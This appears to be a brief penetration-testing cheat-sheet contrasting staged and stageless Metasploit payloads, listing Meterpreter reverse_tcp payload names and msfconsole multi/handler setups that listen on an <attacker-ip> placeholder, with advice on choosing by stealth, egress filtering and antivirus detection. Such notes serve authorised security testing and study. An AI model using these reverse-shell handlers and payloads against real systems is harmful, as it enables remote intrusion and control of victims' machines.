# Payloads

## Staged (multi-stage) payloads

Staged payloads use a small initial stager that connects back to the attacker and then downloads/extracts the larger payload (the "stage"). This keeps the initial network footprint small and is the default for many Meterpreter payloads.

- Example Metasploit payloads:

```
windows/meterpreter/reverse_tcp
linux/x86/meterpreter/reverse_tcp
```

- Example handler (attacker):

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run
```

## Stageless (non-staged) payloads

Stageless (non-staged) payloads contain the full payload in a single stage. They avoid a second-stage download, which can be more reliable across unstable networks and sometimes simpler for bypassing certain network restrictions.

- Example Metasploit payloads:

```
windows/meterpreter_reverse_tcp
linux/x86/meterpreter_reverse_tcp
```

- Example handler (attacker) — same setup but with the stageless payload:

```
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter_reverse_tcp
set LHOST <attacker-ip>
set LPORT 4444
run
```

## When to use which

Choosing staged vs stageless depends on network constraints, detection risk and reliability. Staged payloads have a small initial stager (smaller network footprint, can deliver larger payloads) but require a successful second-stage fetch which can be blocked by egress filters or unstable networks. Stageless payloads contain the full payload up front (more reliable when stage downloads fail or are blocked) but are larger and sometimes easier for network/AV controls to detect or truncate. In practice, try the staged option when outbound connectivity is likely and you want a smaller initial footprint; if the stage download fails or the environment blocks egress, switch to a stageless payload. For thorough testing, try both approaches and pick the one that balances stealth and reliability for the target.
